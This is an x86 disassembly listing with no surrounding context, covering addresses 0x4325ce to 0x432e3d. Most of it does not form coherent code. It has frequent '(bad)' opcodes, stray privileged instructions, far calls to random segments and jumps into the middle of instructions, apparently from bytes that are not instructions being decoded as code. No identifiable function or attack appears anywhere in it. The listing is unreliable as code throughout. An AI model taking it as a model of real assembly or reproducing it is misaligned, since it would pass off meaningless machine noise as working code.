  4325ce:	pop    edi
  4325cf:	cmp    ecx,ecx
  4325d1:	jne    0x432628
  4325d3:	mov    ebp,esp
  4325d5:	cld    
  4325d6:	push   esi
  4325d7:	pop    ebx
  4325d8:	inc    ebp
  4325d9:	stc    
  4325da:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  4325e2:	clc    
  4325e3:	test   dl,dl
  4325e5:	jmp    DWORD PTR ss:[esi+eiz*2+0x5e]
  4325ea:	or     bl,al
  4325ec:	add    BYTE PTR [ebx+0x57665100],cl
  4325f2:	retf   0x3a45
  4325f5:	add    BYTE PTR ss:[esi+eiz*2+0x3a85cabe],bl
  4325fd:	clc    
  4325fe:	add    BYTE PTR [ebx+0x66],bl
  432601:	dec    edx
  432603:	mov    edx,DWORD PTR [edi-0x76]
  432606:	push   edi
  432607:	add    al,0xb7
  432609:	xor    al,0xba
  43260b:	cmp    al,0x8d
  43260d:	je     0x43260e
  43260f:	mov    edx,DWORD PTR [ebx-0x46]
  432612:	push   ecx
  432613:	lea    edi,[ebx+0x534fff]
  432619:	push   ecx
  43261a:	cmp    edx,DWORD PTR [ebx+0x75]
  43261d:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  432623:	add    BYTE PTR [ebx],dh
  432625:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  43262b:	add    BYTE PTR [ebx+esi*1+0x4f64bb34],cl
  432632:	mov    ebx,0x3b3b00
  432637:	jne    0x432664
  432639:	mov    DWORD PTR [ebx+0x728afc],edi
  43263f:	xor    esi,DWORD PTR [ebx]
  432641:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  432647:	push   edi
  432648:	cmp    esp,ebp
  43264a:	jne    0x43264c
  43264c:	sbb    DWORD PTR [eax],0x8085c3fc
  432652:	clc    
  432653:	inc    ebp
  432654:	pop    ebx
  432655:	sti    
  432656:	add    eax,0xeb8bc075
  43265b:	cld    
  43265c:	xor    edi,DWORD PTR ds:0xf8c3855e
  432662:	mov    ecx,DWORD PTR [ecx+edx*2]
  432665:	rol    DWORD PTR [ebp-0x37],0xf
  432669:	mov    DWORD PTR [eax],ecx
  43266b:	inc    edi
  43266c:	(bad)  
  43266d:	in     eax,0x0
  43266f:	add    bh,bh
  432671:	(bad)  
  432672:	mov    esi,0xc38a5e
  432677:	mov    esi,DWORD PTR [ebx]
  432679:	push   ecx
  43267a:	mov    edi,0xfc4fc7
  43267f:	test   DWORD PTR [ebp-0x8],edx
  432682:	xor    ax,0x9cc7
  432686:	sub    ebp,eax
  432688:	inc    ebp
  432689:	(bad)  
  43268a:	sub    edi,edi
  43268c:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  432692:	inc    ebp
  432693:	add    BYTE PTR [esi+0x2b],ah
  432696:	or     bh,BYTE PTR [edx+0xf8ac2]
  43269c:	cmp    al,0x33
  43269e:	mov    edi,DWORD PTR [edx+0x4f81]
  4326a4:	(bad)  
  4326a5:	cmp    esi,DWORD PTR [ebx]
  4326a7:	je     0x432661
  4326a9:	push   ebx
  4326aa:	dec    edi
  4326ab:	str    ecx
  4326ae:	cmp    esp,DWORD PTR [esi+0x75]
  4326b1:	int    0x33
  4326b3:	mov    edi,0x789085f
  4326b8:	mov    edx,DWORD PTR [esp+edi*8]
  4326bb:	add    cl,cl
  4326bd:	data16 add al,0xcb
  4326c0:	push   ebp
  4326c1:	add    ebp,esp
  4326c3:	jne    0x4326b1
  4326c5:	(bad)  
  4326c6:	mov    DWORD PTR [ecx],0xd685f7ec
  4326cc:	clc    
  4326cd:	xlat   BYTE PTR ds:[ebx]
  4326ce:	inc    ebp
  4326cf:	mov    esi,DWORD PTR [eax+edx*2]
  4326d2:	pushf  
  4326d3:	in     eax,0x8b
  4326d5:	add    ah,ch
  4326d7:	add    BYTE PTR [ebx+0x0],dl
  4326da:	push   ecx
  4326db:	add    ax,0x72cb
  4326df:	cmp    al,BYTE PTR [eax]
  4326e1:	add    BYTE PTR [ebp+0x66],al
  4326e4:	(bad)  
  4326e5:	retf   
  4326e6:	lock cmp al,BYTE PTR [ebp+0x4566f800]
  4326ed:	retf   
  4326ee:	cmp    eax,ecx
  4326f0:	pushf  
  4326f1:	jge    0x4326ba
  4326f3:	ss cld 
  4326f5:	pushf  
  4326f6:	test   DWORD PTR [edi-0x8],ebx
  4326f9:	je     0x432740
  4326fb:	xor    esi,DWORD PTR ds:0x7020840
  432701:	ror    BYTE PTR [ebp-0x37],0x8d
  432705:	push   ebp
  432706:	add    esp,ebp
  432708:	jb     0x432695
  43270a:	add    BYTE PTR [eax],cl
  43270c:	dec    ebp
  43270d:	mov    bh,0x81
  43270f:	push   esi
  432710:	push   ebx
  432711:	adc    DWORD PTR [ecx-0x3b],0x3a9aff81
  432718:	xor    al,BYTE PTR [eax]
  43271a:	mov    edx,DWORD PTR [edi+0x10]
  43271d:	(bad)  
  43271e:	scas   eax,DWORD PTR es:[edi]
  43271f:	cmp    bh,BYTE PTR [ebx]
  432721:	add    BYTE PTR [edi],cl
  432723:	mov    ebp,ebp
  432725:	cld    
  432726:	add    BYTE PTR [ebx],bh
  432728:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  43272c:	dec    ebp
  43272d:	or     BYTE PTR [ebx],ch
  43272f:	ret    0x458b
  432732:	lock jmp 0x432726
  432735:	mov    ecx,DWORD PTR [eax]
  432737:	or     BYTE PTR [edi],al
  432739:	mov    ecx,eax
  43273b:	xor    DWORD PTR [edx+0x2],0x0
  43273f:	mov    bh,0xc1
  432741:	adc    BYTE PTR [eax],dh
  432743:	iret   
  432744:	inc    ebp
  432745:	mov    DWORD PTR [ebx],0x4dfff8c5
  43274b:	inc    BYTE PTR [ebx]
  43274d:	cmp    bh,al
  43274f:	add    BYTE PTR [ecx],dl
  432751:	data16 adc al,bh
  432754:	dec    ecx
  432755:	fisttp WORD PTR [ecx+0x456604c0]
  43275b:	add    dh,BYTE PTR ds:0x75e0845
  432761:	ret    0x4d
  432764:	lea    ecx,[ebx+0x18728301]
  43276a:	add    BYTE PTR [ebp+0x45],al
  43276d:	xor    eax,0xc7009ce9
  432772:	add    al,ch
  432774:	inc    ebp
  432775:	test   DWORD PTR [ebx-0x3eba0708],ecx
  43277b:	xor    eax,0x781084d
  432780:	push   ebx
  432781:	call   0xf89a:0x89813251
  432788:	xor    al,BYTE PTR [ebp+0x3b]
  43278b:	cmp    eax,0xc78b9c76
  432790:	or     ah,dh
  432792:	inc    ebp
  432793:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432799:	cmp    ecx,DWORD PTR [ebx-0x74747664]
  43279f:	in     al,dx
  4327a0:	hlt    
  4327a1:	push   ebx
  4327a2:	push   ebx
  4327a3:	push   ecx
  4327a4:	push   ecx
  4327a5:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4327ab:	call   0xe889:0x8b32329a
  4327b2:	clc    
  4327b3:	icebp  
  4327b4:	pop    ebx
  4327b5:	or     BYTE PTR [ebp+0x7],al
  4327b8:	mov    eax,ecx
  4327ba:	clc    
  4327bb:	jb     0x43277e
  4327bd:	add    BYTE PTR [ebp+0x55],cl
  4327c0:	or     DWORD PTR [edi],0xc251d153
  4327c6:	add    DWORD PTR [ebx+0x32009a],0x8b76453b
  4327d0:	mov    edi,eax
  4327d2:	or     cl,al
  4327d4:	inc    ebp
  4327d5:	dec    ebp
  4327d6:	mov    eax,DWORD PTR [ecx+0x514d530c]
  4327dc:	or     WORD PTR [ecx],0x899a
  4327e1:	xor    cl,BYTE PTR [ebx+0x5376fc3b]
  4327e7:	mov    edx,DWORD PTR [ecx+0x8]
  4327ea:	mov    eax,DWORD PTR [ebp-0x8]
  4327ed:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb266]
  4327f4:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4327fa:	inc    ebp
  4327fb:	dec    eax
  4327fc:	add    ecx,DWORD PTR [ebx+0x534df0f8]
  432802:	add    edx,DWORD PTR [ecx-0x8]
  432805:	mov    ecx,DWORD PTR [ecx]
  432807:	clc    
  432808:	or     BYTE PTR [ebp+eax*2+0x4532409a],al
  43280f:	mov    ecx,ebp
  432811:	clc    
  432812:	(bad)  
  432813:	popf   
  432814:	inc    DWORD PTR [eax]
  432816:	ret    0x8b
  432819:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  43281f:	mov    edi,esp
  432821:	hlt    
  432822:	test   ecx,esi
  432824:	clc    
  432825:	or     BYTE PTR [ebp+0x7],al
  432828:	xor    al,0xc1
  43282a:	pushf  
  43282b:	jb     0x432860
  43282d:	add    BYTE PTR [eax-0x3f],al
  432830:	inc    eax
  432831:	daa    
  432832:	inc    ebp
  432833:	inc    ebp
  432834:	xor    eax,0x7f80803
  432839:	dec    ebp
  43283a:	call   0xc09:0x39f83203
  432841:	or     BYTE PTR [edx],al
  432843:	inc    ebp
  432844:	sub    al,0x35
  432846:	inc    ebp
  432847:	or     BYTE PTR ds:0x74d0807,dh
  43284d:	lea    ebx,[edx-0x748dcdff]
  432853:	add    BYTE PTR [eax*2-0x74b21438],cl
  43285a:	mov    edx,DWORD PTR [eax]
  43285c:	cld    
  43285d:	dec    ebp
  43285e:	push   ebx
  43285f:	sub    edx,DWORD PTR [ecx-0x75]
  432862:	add    eax,0xf172fc
  432867:	or     BYTE PTR [ebp+0x7],cl
  43286a:	add    eax,ecx
  43286c:	or     al,0x72
  43286e:	add    DWORD PTR [eax],eax
  432870:	mov    ebx,0x29c2c1
  432875:	inc    ebp
  432876:	mov    eax,DWORD PTR [ebx]
  432878:	cmp    eax,0x3004d1c
  43287e:	xbegin 0x66c8b478
  432884:	clc    
  432885:	or     BYTE PTR [ebp+0x45],al
  432888:	xor    al,0x35
  43288a:	pushf  
  43288b:	or     BYTE PTR [ebx+0x454d1007],cl
  432891:	lea    eax,[ebp+0x33727501]
  432897:	add    cl,ch
  432899:	inc    ebp
  43289a:	add    bl,ch
  43289c:	add    BYTE PTR [ebx+0x45850845],cl
  4328a2:	je     0x43282f
  4328a4:	push   ebx
  4328a5:	or     al,0x85
  4328a7:	dec    ebp
  4328a8:	std    
  4328a9:	mov    bh,bh
  4328ab:	mov    BYTE PTR [ebp-0x75],al
  4328ae:	mov    edi,eax
  4328b0:	or     al,0x89
  4328b2:	inc    ebp
  4328b3:	clc    
  4328b4:	mov    esp,esp
  4328b6:	hlt    
  4328b7:	call   DWORD PTR [edi-0x37]
  4328ba:	push   ebx
  4328bb:	or     al,0x51
  4328bd:	push   ebp
  4328be:	xor    ebp,esp
  4328c0:	mov    esi,0x457251
  4328c5:	xor    eax,0xc7459cc6
  4328ca:	mov    edi,eax
  4328cc:	or     al,0x85
  4328ce:	add    al,bh
  4328d0:	inc    eax
  4328d2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4328d6:	or     ah,bh
  4328d8:	inc    eax
  4328d9:	push   ebx
  4328da:	jmp    0x43292d
  4328dc:	mov    eax,DWORD PTR ds:0xe8720c
  4328e2:	mov    DWORD PTR [ebp-0x8],eax
  4328e5:	jne    0x43292c
  4328e7:	jmp    0x432874
  4328e9:	mov    ebp,DWORD PTR [eax]
  4328eb:	clc    
  4328ec:	retf   0xff53
  4328ef:	push   ecx
  4328f0:	mov    DWORD PTR ds:0x757210,eax
  4328f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4328f9:	sub    esp,DWORD PTR [ebx-0x77]
  4328fc:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432903:	or     ah,bh
  432905:	pop    es
  432906:	ds call 0x8f0:0x8b8b32ff
  43290e:	(bad)  
  43290f:	dec    ebp
  432910:	(bad)  
  432911:	mov    bh,bh
  432913:	jmp    0x432901
  432915:	leave  
  432916:	jne    0x432920
  432918:	call   0x302272
  43291d:	in     al,dx
  43291e:	dec    ebp
  43291f:	add    dh,BYTE PTR [ebx]
  432921:	add    BYTE PTR [ebx],al
  432923:	inc    ebp
  432924:	cmp    esi,DWORD PTR ds:0xc78b9c74
  43292a:	or     al,0xf0
  43292c:	add    BYTE PTR [ebp+0x458bf845],al
  432932:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432938:	adc    al,0x7
  43293a:	enter  0x9fc0,0xa5
  43293e:	rol    BYTE PTR [eax],0x5e
  432941:	mov    ecx,ecx
  432943:	or     al,0xc
  432945:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  43294c:	jmp    0x43294d
  43294e:	push   ebp
  43294f:	mov    esp,ebp
  432951:	cld    
  432952:	inc    ebp
  432953:	inc    ebp
  432954:	or     DWORD PTR [ecx+0x457dec10],0x0
  43295b:	push   esi
  43295c:	push   esi
  43295d:	mov    edi,0x7af080f
  432962:	add    bh,al
  432964:	test   DWORD PTR [edx+0x3a7320f],ebx
  43296a:	add    BYTE PTR [ecx+0x4540100f],cl
  432970:	mov    ebp,eax
  432972:	mov    ebp,edi
  432974:	lock call edx
  432977:	fcom   DWORD PTR [ebp+0x45]
  43297a:	mov    eax,0x148a8b
  43297f:	push   ecx
  432980:	enter  0xc145,0x83
  432984:	cmp    ecx,DWORD PTR [eax]
  432986:	add    BYTE PTR [ebp+0x4d],al
  432989:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  43298f:	call   0xffa324fe
  432994:	cmp    eax,DWORD PTR [ebp-0xc]
  432997:	jmp    DWORD PTR [eax+edx*1-0x4e]
  43299b:	push   ebp
  43299c:	(bad)
  43299f:	std    
  4329a0:	lock push DWORD PTR [edi+0x5d08fcdb]
  4329a7:	inc    ebp
  4329a8:	(bad)  
  4329a9:	call   0xff7d2639
  4329ae:	add    al,BYTE PTR [ebp+0x37]
  4329b1:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  4329b7:	jne    0x4329b9
  4329b9:	(bad)  
  4329ba:	cmp    edi,esp
  4329bc:	jne    0x4329ef
  4329be:	mov    edi,edi
  4329c0:	or     BYTE PTR [ebx-0x307f0b49],cl
  4329c6:	pop    ds
  4329c7:	into   
  4329c8:	je     0x43298b
  4329ca:	mov    ebx,DWORD PTR [esi]
  4329cc:	or     BYTE PTR [ebp-0x49],al
  4329cf:	mov    esp,DWORD PTR [esi-0x77]
  4329d2:	mov    esi,0x451f0c
  4329d7:	mov    eax,DWORD PTR [eax]
  4329d9:	or     al,0x66
  4329db:	sar    bl,0x3b
  4329de:	xor    esi,DWORD PTR [ebp+0x66]
  4329e1:	xor    ecx,edi
  4329e3:	pop    edi
  4329e4:	adc    bl,BYTE PTR [ebx+0x7c]
  4329e7:	ret    0xff
  4329ea:	cld    
  4329eb:	inc    ebp
  4329ec:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  4329f2:	cld    
  4329f3:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  4329fa:	push   0xffffff83
  4329fc:	pop    edi
  4329fd:	or     BYTE PTR [ebp+0x53],dh
  432a00:	xorps  xmm1,xmm2
  432a03:	test   BYTE PTR [eax+eax*1],bh
  432a06:	add    BYTE PTR [eax],al
  432a08:	adc    eax,eax
  432a0a:	add    DWORD PTR [esp+edi*2-0xff7b00],0xffffffb7
  432a12:	jmp    DWORD PTR [eax]
  432a14:	ror    al,0x5e
  432a17:	inc    ebp
  432a18:	leave  
  432a19:	xor    ecx,DWORD PTR [eax]
  432a1b:	and    DWORD PTR [ebx-0x3ec50708],ecx
  432a21:	add    ch,al
  432a23:	xor    edi,edi
  432a25:	xor    DWORD PTR [ebx],0x66003300
  432a2b:	mov    DWORD PTR [ebp-0xc],ecx
  432a2e:	pcmpgtw mm0,mm0
  432a31:	add    dl,ah
  432a33:	leave  
  432a34:	mov    edi,DWORD PTR [esi-0x7d]
  432a37:	push   ax
  432a39:	dec    ebp
  432a3a:	mov    esi,DWORD PTR [ebx-0x75]
  432a3d:	lea    ebp,[eax-0x7c010000]
  432a43:	xor    eax,DWORD PTR [eax]
  432a45:	sysret 
  432a47:	dec    ebp
  432a48:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432a4f:	push   WORD PTR [ecx+0x8]
  432a53:	jne    0x432a16
  432a55:	ud0    ecx,DWORD PTR [ecx]
  432a58:	mov    edi,DWORD PTR [edx]
  432a5a:	lods   al,BYTE PTR ds:[esi]
  432a5b:	add    BYTE PTR [eax],al
  432a5d:	data16 (bad) 
  432a5f:	iret   
  432a60:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432a67:	cli    
  432a68:	inc    ebp
  432a69:	cmp    al,0x8d
  432a6b:	add    BYTE PTR [esi+0x2d],ah
  432a6e:	inc    ebp
  432a6f:	pop    ebp
  432a70:	lea    ecx,[edi]
  432a72:	mov    dl,bh
  432a74:	add    BYTE PTR [edi],cl
  432a76:	mov    DWORD PTR [eax+eax*8],edi
  432a79:	mov    ebx,0x3b87
  432a7e:	add    BYTE PTR [ebx],ch
  432a80:	inc    ebp
  432a81:	data16 (bad) 
  432a83:	clc    
  432a84:	int3   
  432a85:	cmp    eax,DWORD PTR [eax]
  432a87:	je     0x432a12
  432a89:	push   0xffffffc8
  432a8b:	pop    edi
  432a8c:	xchg   DWORD PTR [ebp+0x0],eax
  432a8f:	data16 add BYTE PTR [ebp+0x45],cl
  432a93:	lea    cx,[ebp+0x10]
  432a97:	jb     0x432a99
  432a99:	jmp    0x432a24
  432a9b:	call   eax
  432a9d:	clc    
  432a9e:	xchg   DWORD PTR [edi+0x1],edi
  432aa1:	mov    eax,DWORD PTR [eax]
  432aa3:	or     BYTE PTR [ebp-0x49],al
  432aa6:	lea    eax,[eax+0x74003154]
  432aac:	push   edi
  432aad:	inc    edx
  432aae:	jge    0x432aaf
  432ab0:	mov    DWORD PTR [edi],ecx
  432ab2:	fdiv   DWORD PTR [edi-0x6]
  432ab5:	inc    DWORD PTR [eax]
  432ab7:	xor    edx,DWORD PTR [eax+0x5f]
  432aba:	xchg   DWORD PTR [ebx+0x1],ebx
  432abd:	ret    0x0
  432ac0:	xor    BYTE PTR [ebp-0x51],cl
  432ac3:	cmp    edi,0xf0ff8900
  432ac9:	data16 ror al,0x84
  432acd:	rol    BYTE PTR [eax],0x3b
  432ad0:	add    al,dh
  432ad2:	dec    eax
  432ad3:	xchg   esp,eax
  432ad4:	push   ebx
  432ad5:	jmp    0x432a62
  432ad7:	push   ebp
  432ad8:	add    esp,ebp
  432ada:	add    ebp,esp
  432adc:	mov    edx,DWORD PTR [edi+0x24]
  432adf:	clc    
  432ae0:	dec    esi
  432ae1:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432ae7:	cmp    BYTE PTR [ebx],al
  432ae9:	jne    0x432a74
  432aeb:	xor    esp,eax
  432aed:	jmp    0x462c70
  432af2:	add    ebp,DWORD PTR [ecx+ecx*4]
  432af5:	jne    0x432aeb
  432af7:	call   0xffcd2851
  432afc:	clc    
  432afd:	xchg   edi,eax
  432afe:	sti    
  432aff:	add    DWORD PTR [ebx],eax
  432b01:	add    BYTE PTR [ebp+0x47],bl
  432b04:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432b0a:	pop    ebp
  432b0b:	mov    DWORD PTR [esi-0x48],esi
  432b0e:	jmp    0x432b57
  432b10:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432b16:	(bad)  
  432b18:	cmp    al,0x0
  432b1a:	cmp    eax,DWORD PTR [ebp+0x18]
  432b1d:	lea    ebx,[ebp-0x56]
  432b20:	jle    0x432b22
  432b22:	jae    0x432aad
  432b24:	mov    eax,esp
  432b26:	call   0xb900:0x8b005587
  432b2d:	inc    ebp
  432b2e:	push   ebp
  432b2f:	lea    ecx,[ebp-0x27ff4f12]
  432b35:	mov    eax,edi
  432b37:	int3   
  432b38:	push   ebp
  432b39:	xchg   edi,eax
  432b3b:	add    esp,ebp
  432b3d:	add    BYTE PTR [eax],al
  432b3f:	inc    ebp
  432b40:	add    BYTE PTR [ebp+0x8b3255],cl
  432b46:	cld    
  432b47:	mov    DWORD PTR [edx],edi
  432b49:	aam    0x75
  432b4b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432b51:	mov    DWORD PTR [ebx-0x50],edx
  432b54:	test   BYTE PTR [ebp-0x1],0xe8
  432b58:	mov    eax,DWORD PTR [eax]
  432b5a:	hlt    
  432b5b:	add    al,al
  432b5d:	mov    eax,DWORD PTR ds:0x890045a8
  432b63:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432b69:	inc    DWORD PTR [eax*2+0xf75854d]
  432b70:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432b76:	call   0x729988b7
  432b7b:	je     0x432bdb
  432b7d:	js     0x432bde
  432b7f:	lock ret 0x7e
  432b83:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432b89:	mov    edi,edi
  432b8b:	sbb    al,bl
  432b8d:	clc    
  432b8e:	add    BYTE PTR [ebp-0x73],bh
  432b91:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432b97:	ror    BYTE PTR [eax],1
  432b99:	dec    ebp
  432b9a:	xchg   ebp,eax
  432b9b:	mov    edi,edi
  432b9d:	in     al,0x8b
  432b9f:	jge    0x432b2a
  432ba1:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432ba7:	clc    
  432ba8:	pop    esi
  432ba9:	fist   DWORD PTR [ebp+0x5d398b5d]
  432baf:	clc    
  432bb0:	add    al,0x6e
  432bb2:	mov    eax,DWORD PTR [ebx]
  432bb4:	mov    BYTE PTR [ebp+0x0],dl
  432bb7:	mov    edx,DWORD PTR [ebx-0x20]
  432bba:	adc    esi,DWORD PTR [edi+0x5e005f3a]
  432bc0:	add    eax,0x3b3b73
  432bc5:	adc    al,0x89
  432bc7:	pop    eax
  432bc8:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432bcc:	ret    0xf08
  432bcf:	cmp    al,0x2
  432bd1:	mov    DWORD PTR [edx],edi
  432bd3:	cld    
  432bd4:	add    BYTE PTR [ebp+0x66],dl
  432bd7:	add    eax,ebx
  432bd9:	add    esp,eax
  432bdb:	sub    eax,eax
  432bdd:	or     BYTE PTR [ecx-0x77f474bb],cl
  432be3:	add    BYTE PTR [eax],al
  432be5:	mov    DWORD PTR [ebx-0x24],ebx
  432be8:	push   edi
  432be9:	push   ebp
  432bea:	clc    
  432beb:	add    DWORD PTR [esi+0x1b0100],0x45
  432bf2:	out    0xff,eax
  432bf4:	add    edx,DWORD PTR [eax]
  432bf6:	jmp    0x432be0
  432bf8:	cmp    ch,0x45
  432bfb:	(bad)  
  432bfc:	jmp    0x40c8b44e
  432c01:	je     0x432b8d
  432c03:	mov    eax,DWORD PTR [eax-0x10c78304]
  432c09:	inc    ebp
  432c0a:	add    BYTE PTR [ebx-0x770375],al
  432c10:	add    ah,ch
  432c12:	add    edx,esp
  432c14:	pop    edi
  432c15:	pop    ebp
  432c16:	push   ebp
  432c17:	inc    ebx
  432c18:	in     al,dx
  432c19:	pop    ebp
  432c1a:	in     al,dx
  432c1b:	cmp    edx,DWORD PTR [edi-0x8]
  432c1e:	xor    eax,0x895b9c94
  432c23:	leave  
  432c24:	call   0x8998732d
  432c29:	in     al,dx
  432c2a:	in     al,0x45
  432c2c:	dec    ebp
  432c2d:	push   esi
  432c2e:	test   DWORD PTR [eax+0xfb010f],esi
  432c34:	add    BYTE PTR [eax+0xc018b],dh
  432c3a:	leave  
  432c3b:	inc    ebp
  432c3c:	test   al,ch
  432c3e:	add    dh,bh
  432c40:	add    bh,bh
  432c42:	dec    ebp
  432c43:	push   cs
  432c44:	mov    DWORD PTR [ecx],eax
  432c46:	hlt    
  432c47:	push   es
  432c48:	dec    ebp
  432c49:	leave  
  432c4a:	mov    DWORD PTR [eax],ecx
  432c4c:	clc    
  432c4d:	cmovge eax,ecx
  432c50:	mov    ecx,0x85c2f0
  432c56:	clc    
  432c57:	pop    DWORD PTR [ebp+0x1]
  432c5a:	push   ebx
  432c5b:	add    BYTE PTR [ebp-0x15],bh
  432c5e:	push   esi
  432c5f:	xor    eax,0x898a45
  432c64:	cld    
  432c65:	add    BYTE PTR [ebp+0x0],al
  432c68:	cmp    esp,DWORD PTR [esi-0x64]
  432c6b:	add    DWORD PTR [esi+0x78308c1],edi
  432c71:	add    ah,BYTE PTR [esi-0x49]
  432c74:	int    0xbb
  432c76:	mov    ecx,DWORD PTR [edi+0xc]
  432c79:	add    dh,al
  432c7b:	cmp    ecx,ebx
  432c7d:	jne    0x432c47
  432c7f:	xor    ecx,DWORD PTR [ebp+0x66]
  432c82:	jmp    0xca2c88
  432c87:	add    DWORD PTR [ebp+0x0],eax
  432c8a:	mov    eax,ebx
  432c8c:	or     al,0x8b
  432c8e:	(bad)  
  432c8f:	mov    ecx,esi
  432c91:	mov    BYTE PTR [eax+eax*1+0x664c134],cl
  432c98:	mov    eax,edi
  432c9a:	or     BYTE PTR [edx],cl
  432c9c:	shl    cl,cl
  432c9e:	icebp  
  432c9f:	add    BYTE PTR [ebp+0x39],0x8b
  432ca3:	or     BYTE PTR [edx+eax*2],cl
  432ca6:	(bad)  
  432ca7:	or     cl,dh
  432ca9:	stc    
  432caa:	shl    DWORD PTR [ebp-0x30],0xc6
  432cae:	xor    al,0x0
  432cb0:	inc    ebp
  432cb1:	xchg   BYTE PTR [ebx],al
  432cb3:	add    esp,edi
  432cb5:	add    BYTE PTR [ebp-0x39],cl
  432cb8:	mov    al,bl
  432cba:	test   DWORD PTR [ebx+0x1c348375],ecx
  432cc0:	sub    al,0xbf
  432cc2:	jmp    0x432c49
  432cc4:	mov    edi,eax
  432cc6:	lock jge 0x432cba
  432cc9:	lea    esi,[edx-0x74bad501]
  432ccf:	mov    ebp,esp
  432cd1:	or     cl,dh
  432cd3:	leave  
  432cd4:	add    al,BYTE PTR [eax+eax*4-0x37ff9a00]
  432cdb:	dec    ebp
  432cdc:	dec    ebp
  432cdd:	test   DWORD PTR [ebx],eax
  432cdf:	paddb  mm6,mm0
  432ce2:	add    DWORD PTR [eax],eax
  432ce4:	dec    ebp
  432ce5:	mov    ecx,DWORD PTR [ebx-0x65b217f0]
  432ceb:	mov    esi,DWORD PTR [edx]
  432ced:	or     al,0x2b
  432cef:	dec    ebp
  432cf0:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432cf6:	mov    esp,eax
  432cf8:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432cff:	mov    DWORD PTR [ebx],ebp
  432d01:	call   0xc76b631
  432d06:	mov    DWORD PTR [ebp+0x10],ecx
  432d09:	(bad)  
  432d0a:	push   0x8b85ff10
  432d0f:	clc    
  432d10:	or     al,0x53
  432d12:	(bad)  
  432d13:	push   ecx
  432d14:	retf   
  432d15:	mov    ebx,0xff4d8dc8
  432d1a:	mov    DWORD PTR [ebp+0x8],eax
  432d1d:	xor    eax,DWORD PTR [ebp-0x75]
  432d20:	cmp    ebp,DWORD PTR [ebx]
  432d22:	lsl    ebx,WORD PTR [edi-0x8]
  432d26:	call   DWORD PTR [ebx-0x741bff75]
  432d2c:	(bad)  
  432d2d:	or     al,0x5b
  432d2f:	dec    ebp
  432d30:	or     BYTE PTR [ebx],dh
  432d32:	inc    ebp
  432d33:	xor    esi,DWORD PTR ds:0x708088d
  432d39:	in     eax,0x9a
  432d3b:	add    BYTE PTR [edx],dh
  432d3d:	inc    ebp
  432d3e:	pop    edi
  432d3f:	xor    eax,edx
  432d41:	test   DWORD PTR [eax],0x81108b8b
  432d47:	dec    ebp
  432d48:	sub    al,0x33
  432d4a:	add    BYTE PTR [ebx],dh
  432d4c:	push   esi
  432d4d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432d53:	mov    edi,eax
  432d55:	or     BYTE PTR [ebp+0x45],al
  432d58:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432d5e:	xor    eax,0xc7069cc9
  432d63:	inc    ebp
  432d64:	cld    
  432d65:	cmp    DWORD PTR [ebp+0x454df817],eax
  432d6b:	cmp    BYTE PTR ds:0xc7669c53,0xd1
  432d72:	in     al,0x4d
  432d74:	xchg   BYTE PTR [eax-0x3dbaac08],al
  432d7a:	aad    0xe9
  432d7c:	xlat   BYTE PTR ds:[ebx]
  432d7d:	rol    bh,cl
  432d7f:	mov    edx,esp
  432d81:	or     BYTE PTR [ebp+0x4588f84d],al
  432d87:	mov    ecx,DWORD PTR [eax]
  432d89:	or     BYTE PTR [eax],al
  432d8b:	push   ebp
  432d8c:	mov    edi,DWORD PTR [eax+0xfc728b]
  432d92:	dec    ebp
  432d93:	enter  0xceba,0x8
  432d97:	retf   0x1807
  432d9a:	ret    0x9a4d
  432d9d:	mov    esi,DWORD PTR [edx]
  432d9f:	or     al,0x33
  432da1:	into   
  432da2:	add    edx,esi
  432da4:	add    ecx,edx
  432da6:	bswap  eax
  432da8:	ror    esi,0x98
  432dab:	dec    ebp
  432dac:	add    cl,ch
  432dae:	mov    edi,edi
  432db0:	hlt    
  432db1:	inc    esi
  432db3:	inc    ebp
  432db4:	ret    0x4533
  432db7:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432dbd:	or     BYTE PTR [ebx],dh
  432dbf:	dec    ebp
  432dc0:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432dc6:	jne    0xff8d2d8d
  432dcc:	inc    ebp
  432dcd:	inc    ebp
  432dce:	mov    esi,DWORD PTR [ebx]
  432dd0:	clc    
  432dd1:	pop    esi
  432dd2:	ret    0xcaeb
  432dd5:	mov    eax,esi
  432dd7:	call   0x520481aa
  432ddc:	dec    ebp
  432ddd:	add    eax,0xf8728b
  432de2:	adc    eax,0xce0ccac9
  432de7:	push   ebp
  432de8:	ret    0xc6ec
  432deb:	in     al,dx
  432dec:	call   0x33437af5
  432df1:	push   edi
  432df2:	add    edi,eax
  432df4:	xor    eax,eax
  432df6:	jmp    0x432e3d
